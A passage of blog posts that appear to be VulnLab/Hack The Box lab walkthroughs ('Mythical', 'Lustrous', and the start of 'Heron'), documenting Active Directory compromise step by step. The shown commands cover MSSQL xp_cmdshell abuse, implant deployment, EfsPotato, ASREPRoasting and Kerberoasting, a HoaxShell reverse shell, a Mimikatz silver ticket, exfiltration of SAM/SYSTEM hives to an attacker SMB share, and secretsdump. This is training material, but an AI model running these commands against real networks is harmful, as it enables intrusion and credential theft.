= b.principal_id WHERE a.permission_name = &#x27;IMPERSONATE&#x27;;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/we_cant_imp.png" alt="Cannot Impersonate Users"><br>Listing database owners:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -d msdb -Q &quot;SELECT rp.name as database_role, mp.name as database_user from sys.database_role_members drm join sys.database_principals rp on (drm.role_principal_id = rp.principal_id) join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/owner_of_db.png" alt="Database Ownership"><br>We will escalate from svc_sql to dbo following SQL privilege escalation techniques:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;SELECT name, is_trustworthy_on FROM sys.databases WHERE name = &#x27;msdb&#x27;;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/trustworthy_database.png" alt="Trustworthy Database"><br>Create a malicious stored procedure in <code>msdb</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -d msdb -Q &quot;CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember &#x27;MYTHICAL-EU\svc_sql&#x27;, &#x27;sysadmin&#x27;;&quot;</span><br></pre></td></tr></table></figure><p>Execute the stored procedure:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -d msdb -Q &quot;EXEC sp_elevate_me;&quot;</span><br></pre></td></tr></table></figure><p>Verify sysadmin role:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/sys_admin_achived.png" alt="Sysadmin Achieved"><br>Enable xp_cmdshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE; EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE; EXEC xp_cmdshell &#x27;whoami&#x27;;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/xp_cmdshell_anabled.png" alt="xp_cmdshell Enabled"><br>We are running as <code>nt service\mssql$sqlexpress</code>.</p><h2 id="Payload-Deployment"><a href="#Payload-Deployment" class="headerlink" title="Payload Deployment"></a>Payload Deployment</h2><p>Create a share for our agent:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -Path C:\hello</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net share hello=C:\hello /grant:everyone,full</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -Source C:/programdata/google/update.exe -Destination C:/hello/update.exe</span><br></pre></td></tr></table></figure><p>Copy from the share to DC02:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;EXEC xp_cmdshell &#x27;copy \\10.10.139.85\hello\update.exe C:\Windows\Temp\update.exe&#x27;;&quot;</span><br></pre></td></tr></table></figure><p>Execute it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:/Users/Administrator/sql.exe -S tcp:10.10.139.87,1433 -Q &quot;EXEC xp_cmdshell &#x27;C:\Windows\Temp\update.exe&#x27;;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/wegot_dc02.png" alt="DC02 Access Gained"></p><h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><p>Since we’re running as a service, we have the <code>SeImpersonatePrivilege</code> enabled. We’ll use EfsPotato since SweetPotato doesn’t work:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register_assembly EfsPotato.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute_assembly EfsPotato.exe \\10.10.139.85\hello\update.exe</span><br></pre></td></tr></table></figure><p><img src="/images/Mythical/we_got_system_dc02.png" alt="System Access on DC02"></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
            <tag> Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Lustrous</title>
      <link href="/2025/04/19/VL-Lustrous/"/>
      <url>/2025/04/19/VL-Lustrous/</url>
      
        <content type="html"><![CDATA[<h1 id="Lustrous-Exploiting-AD-Privilege-Escalation-Through-Credential-Extraction"><a href="#Lustrous-Exploiting-AD-Privilege-Escalation-Through-Credential-Extraction" class="headerlink" title="Lustrous: Exploiting AD Privilege Escalation Through Credential Extraction"></a>Lustrous: Exploiting AD Privilege Escalation Through Credential Extraction</h1><p>In this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetrate the “Lustrous” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous FTP access and Kerberos pre-authentication weaknesses, we’ll progress through lateral movement techniques, credential extraction from encrypted files, and ultimately achieve domain administrator access via a silver ticket attack and DCSync exploitation.<br>This penetration test showcases several real-world Active Directory attack vectors including ASREPRoasting, credential decryption from serialized PowerShell objects, Kerberos silver ticket forgery, and leveraging backup privileges for extracting domain hashes. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during assessments.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>The first step in our penetration test was gathering information about the target system using an Nmap scan:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-18 11:52:41Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">443/tcp   open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: lustrous.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: LUSTROUS</span><br><span class="line">|   NetBIOS_Domain_Name: LUSTROUS</span><br><span class="line">|   NetBIOS_Computer_Name: LUSDC</span><br><span class="line">|   DNS_Domain_Name: lustrous.vl</span><br><span class="line">|   DNS_Computer_Name: LusDC.lustrous.vl</span><br><span class="line">|   DNS_Tree_Name: lustrous.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-04-18T11:53:35+00:00</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">60046/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">60047/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">60086/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">60103/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="Anonymous-FTP-Enumeration"><a href="#Anonymous-FTP-Enumeration" class="headerlink" title="Anonymous FTP Enumeration"></a>Anonymous FTP Enumeration</h2><p>The Nmap scan revealed Anonymous FTP login was allowed, so we accessed it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.181.149</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/pot_users.png" alt="Potential User Accounts"></p><p>From the FTP server, we discovered several user accounts:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ben.cox</span><br><span class="line">rachel.parker</span><br><span class="line">tony.ward</span><br><span class="line">wayne.taylor</span><br></pre></td></tr></table></figure><h2 id="Kerberos-User-Enumeration"><a href="#Kerberos-User-Enumeration" class="headerlink" title="Kerberos User Enumeration"></a>Kerberos User Enumeration</h2><p>Next, we used Kerbrute to enumerate users in the Active Directory domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum -d lustrous.vl ~/Downloads/usernames.txt --dc 10.10.181.149</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/no_preauth.png" alt="No Pre-Authentication Required"></p><h2 id="Kerberoasting-Attack"><a href="#Kerberoasting-Attack" class="headerlink" title="Kerberoasting Attack"></a>Kerberoasting Attack</h2><p>We used Impacket to grab the hash since hashcat doesn’t support the <code>$18$</code> format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetNPUsers lustrous.vl/ -usersfile ~/Downloads/usernames.txt -dc-ip 10.10.181.149</span><br></pre></td></tr></table></figure><p>Then we cracked the hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash2020.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/cracked_hash.png" alt="Cracked Hash"><br>Successfully obtained credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ben.cox : &lt;PASS&gt;</span><br></pre></td></tr></table></figure><h2 id="Password-Spraying-and-User-Enumeration"><a href="#Password-Spraying-and-User-Enumeration" class="headerlink" title="Password Spraying and User Enumeration"></a>Password Spraying and User Enumeration</h2><p>Don’t forget to spray the password across other accounts!<br><img src="/images/Lustrous/acces_to_both_machines.png" alt="Access to Both Machines"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.181.149 -u &#x27;ben.cox&#x27; -p &#x27;&lt;PASS&gt;&#x27; --users</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/all_users.png" alt="All Users in Domain"><br>Complete list of domain users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">Deborah.Harris</span><br><span class="line">Duncan.Spencer</span><br><span class="line">Brenda.Andrews</span><br><span class="line">Rachel.Parker</span><br><span class="line">Wayne.Taylor</span><br><span class="line">Hugh.Wilkinson</span><br><span class="line">Tracy.Roberts</span><br><span class="line">Bradley.Hancock</span><br><span class="line">Tony.Ward</span><br><span class="line">Joanna.Hall</span><br><span class="line">Marian.Elliott</span><br><span class="line">Ben.Cox</span><br><span class="line">Joanna.Harvey</span><br><span class="line">Jeremy.Clark</span><br><span class="line">Allan.Parker</span><br><span class="line">Mitchell.Fuller</span><br><span class="line">Colin.Dodd</span><br><span class="line">Liam.Atkinson</span><br><span class="line">Michelle.John</span><br><span class="line">Iain.Evans</span><br><span class="line">Donna.Collins</span><br><span class="line">Cameron.Walsh</span><br><span class="line">svc_web</span><br><span class="line">svc_db</span><br></pre></td></tr></table></figure><h2 id="Service-Account-Enumeration-and-Attack"><a href="#Service-Account-Enumeration-and-Attack" class="headerlink" title="Service Account Enumeration and Attack"></a>Service Account Enumeration and Attack</h2><p>Using Impacket to find service accounts with SPNs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetUserSPNs lustrous.vl/ben.cox:&lt;PASS&gt; -dc-ip 10.10.172.117 -request</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/svc_hash.png" alt="Service Account Hash"><br>Successfully cracked the <code>svc_web</code> account password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_web : &lt;PASS&gt;</span><br></pre></td></tr></table></figure><h2 id="BloodHound-Collection"><a href="#BloodHound-Collection" class="headerlink" title="BloodHound Collection"></a>BloodHound Collection</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.172.117 -u &#x27;svc_web&#x27; -p &#x27;&lt;PASS&gt;&#x27; --bloodhound --dns-server 10.10.172.117 -c ALL --dns-tcp</span><br></pre></td></tr></table></figure><h2 id="Lateral-Movement-to-Member-Server"><a href="#Lateral-Movement-to-Member-Server" class="headerlink" title="Lateral Movement to Member Server"></a>Lateral Movement to Member Server</h2><p>We discovered that Ben.Cox has WinRM access to the LusMS.lustrous.vl machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm 10.10.172.118 -u ben.cox -p &#x27;&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/winrm_acces.png" alt="WinRM Access"></p><h2 id="Privilege-Escalation-via-Encrypted-Credentials"><a href="#Privilege-Escalation-via-Encrypted-Credentials" class="headerlink" title="Privilege Escalation via Encrypted Credentials"></a>Privilege Escalation via Encrypted Credentials</h2><p>Found admin.xml file on the user’s desktop:<br><img src="/images/Lustrous/admin_xml.png" alt="Admin XML File"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download admin.xml</span><br></pre></td></tr></table></figure><p>This XML output contains a <strong>serialized PowerShell PSCredential object</strong> with encrypted credentials for <code>LUSMS\Administrator</code>.<br><img src="/images/Lustrous/xml_opened.png" alt="XML Opened"><br>To extract the password, we used a HoaxShell to get an interactive PowerShell session:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 -p 4444</span><br></pre></td></tr></table></figure><p>After connecting to the desktop directory, we executed these PowerShell commands:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$cred = Import-Clixml -Path .\admin.xml</span><br><span class="line">$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password)</span><br><span class="line">$PlainPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)</span><br><span class="line">Write-Output &quot;Decrypted password: $PlainPassword&quot;</span><br></pre></td></tr></table></figure><p>This returned the local Administrator password for LusMS.lustrous.vl.<br>Verifying access with the obtained credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.172.118 -u Administrator -p &#x27;&lt;PASS&gt;&#x27; -d .</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/admin_on_ms.png" alt="Admin Access on Member Server"></p><h2 id="Pivoting-to-Domain-Controller"><a href="#Pivoting-to-Domain-Controller" class="headerlink" title="Pivoting to Domain Controller"></a>Pivoting to Domain Controller</h2><p>First, we established an RDP session to LusMS using the administrator account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.212.102 /u:Administrator /p:&#x27;&lt;PASS&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/443_onn_dc.png" alt="Port 443 on DC"><br>We logged in using Ben.Cox’s credentials:<br><img src="/images/Lustrous/usefull_info.png" alt="Useful Information"></p><h2 id="Creating-a-Silver-Ticket"><a href="#Creating-a-Silver-Ticket" class="headerlink" title="Creating a Silver Ticket"></a>Creating a Silver Ticket</h2><p>Since we had the web service account password, we created a silver ticket to exploit the website hosted on the DC and access other users’ notes.<br>First, we uploaded Mimikatz to LusMS and ran it as SYSTEM to disable real-time monitoring (via the RDP session):<br><img src="/images/Lustrous/mimikatz.png" alt="Mimikatz"><br>We needed the domain SID and the RC4 hash of the web_svc account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid lustrous.vl/ben.cox:&#x27;&lt;PASS&gt;&#x27;@10.10.246.101</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/domainsid.png" alt="Domain SID"><br>Domain SID: <code>S-1-5-21-2355092754-1584501958-1513963426</code><br>We then converted the web_svc password to MD4 format with UTF-16LE encoding to get the RC4 hash using an online tool.<br>In Mimikatz, we executed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /ptt /id:1114 /target:LusDC.lustrous.vl /service:HTTP /rc4:&lt;WEB_SVC HASH&gt; /user:tony.ward</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/key.png" alt="Ticket Key"><br>We then switched to a CMD session and ran:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe&quot; --profile-directory=&quot;Default&quot; --auth-server-whitelist=&quot;LusDc.lustrous.vl&quot; http://LusDc.lustrous.vl</span><br></pre></td></tr></table></figure><p>This opened the Edge browser and authenticated using our forged ticket:<br><img src="/images/Lustrous/tony_pass.png" alt="Tony&#39;s Password"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tony.ward : &lt;PASS&gt;</span><br></pre></td></tr></table></figure><h2 id="DCSync-Attack-via-Backup-Privileges"><a href="#DCSync-Attack-via-Backup-Privileges" class="headerlink" title="DCSync Attack via Backup Privileges"></a>DCSync Attack via Backup Privileges</h2><p>Tony.Ward is a member of Backup Operators, which has <code>SeBackup</code> and <code>SeRestore</code> privileges allowing access to any file, including <code>ntds.dit</code>. As we cant winrm with Tony we will use smb to get SAM,SYSTEM and SECURITY hives.<br>First, we started an SMB server:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbserver hello ./share -smb2support</span><br></pre></td></tr></table></figure><p>Then, we extracted the registry hives:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg.py lustrous.vl/tony.ward:&lt;PASS&gt;@10.10.246.101 save -keyName &#x27;HKLM\SAM&#x27; -o &#x27;\\10.8.5.195\hello&#x27;</span><br><span class="line">reg.py lustrous.vl/tony.ward:&lt;PASS&gt;@10.10.246.101 save -keyName &#x27;HKLM\SYSTEM&#x27; -o &#x27;\\10.8.5.195\hello&#x27;</span><br><span class="line">reg.py lustrous.vl/tony.ward:&lt;PASS&gt;@10.10.246.101 save -keyName &#x27;HKLM\SECURITY&#x27; -o &#x27;\\10.8.5.195\hello&#x27;</span><br></pre></td></tr></table></figure><p>We then dumped the secrets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam ./SAM.save -system ./SYSTEM.save -security ./SECURITY.save local</span><br></pre></td></tr></table></figure><p><img src="/images/Lustrous/machine_acc_hash.png" alt="Machine Account Hash"><br>With the DC machine account hash, we could now dump all domain hashes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py &#x27;LusDC$&#x27;@10.10.246.101 -hashes&#x27;:&lt;HASH&gt;&#x27;</span><br></pre></td></tr></table></figure><p>This returned the domain administrator hash, allowing us to access the DC via WinRM and capture the flag.</p><p><a href="https://api.vulnlab.com/api/v1/share?id=3e1b2cf9-e911-4b8c-a741-d4d862dba811">https://api.vulnlab.com/api/v1/share?id=3e1b2cf9-e911-4b8c-a741-d4d862dba811</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
            <tag> Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Heron</title>
      <link href="/2025/04/15/VL-Heron/"/>
      <url>/2025/04/15/VL-Heron/</url>
      
        <content type="html"><![CDATA[<h1 id="Heron-Advanced-Network-Pivoting-and-Active-Directory-Delegation-Attacks"><a href="#Heron-Advanced-Network-Pivoting-and-Active-Directory-Delegation-Attacks" class="headerlink" title="Heron: Advanced Network Pivoting and Active Directory Delegation Attacks"></a>Heron: Advanced Network Pivoting and Active Directory Delegation Attacks</h1><p>In this detailed VulnLab - Hack The Box walkthrough, I’ll demonstrate how to compromise the “Heron” domain environment through network pivoting, credential extraction, and advanced delegation attacks. Starting with initial SSH access to a Linux jumpbox, we’ll navigate through a multi-tier network to ultimately achieve domain administrator privileges by exploiting Resource-Based Constrained Delegation (RBCD).<br>This penetration test showcases sophisticated attack techniques across a hybrid Windows&#x2F;Linux environment, including network pivoting with Ligolo-NG, web application exploitation, Kerberos authentication abuse, and leveraging group permissions for delegation attacks. The walkthrough highlights critical security misconfigurations often overlooked in complex network environments that penetration testers should be vigilant about.</p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>From the wiki, we obtain initial credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pentest:Heron123!</span><br></pre></td></tr></table></figure><p>Port scan reveals:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br></pre></td></tr></table></figure><h2 id="Network-Pivoting-with-Ligolo-NG"><a href="#Network-Pivoting-with-Ligolo-NG" class="headerlink" title="Network Pivoting with Ligolo-NG"></a>Network Pivoting with Ligolo-NG</h2><p>Setting up the tunnel on your attack machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip tuntap add user &#123;USER&#125; mode tun ligolo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link set ligolo up</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface_create --name &quot;evil-cha&quot;</span><br></pre></td></tr></table></figure><p>On the Linux target:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent -connect 10.8.5.195:11601 --ignore-cert</span><br></pre></td></tr></table></figure><p>After connecting, select the session using the <code>session</code> command:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tunnel_start --tun evil-cha</span><br></pre></td></tr></table></figure><p>This will add a route only for the Windows machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">interface_add_route --name evil-cha --route HERE/32</span><br></pre></td></tr></table></figure><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>Port 80 is open, and we discover several users from the Linux machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc-web-accounting-d@heron.vl  svc-web-accounting@heron.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/psooibe_users.png" alt="User list from Linux machine"><br>Additional users found:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wayne.wood@heron.vl</span><br><span class="line">julian.pratt@heron.vl</span><br><span class="line">samuel.davies@heron.vl</span><br></pre></td></tr></table></figure><h2 id="User-Enumeration-and-Authentication"><a href="#User-Enumeration-and-Authentication" class="headerlink" title="User Enumeration and Authentication"></a>User Enumeration and Authentication</h2><p>We use kerbrute to verify if the discovered users are valid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kerbrute userenum -d heron.vl --dc 10.10.232.133 ~/Downloads/usernames.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/kerberute.png" alt="Kerbrute output"><br>It returned hashes in the <code>$18$</code> format, but hashcat uses the <code>$23$</code> format. We’ll use Impacket’s GetNPUsers to get the correct format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -usersfile ~/Downloads/usernames.txt -dc-ip &quot;10.10.232.133&quot; &quot;heron.vl&quot;/</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/23hash_formta.png" alt="Hashcat format conversion"><br>Cracking the hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash223.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Heron/crackee_pass.png" alt="Cracked 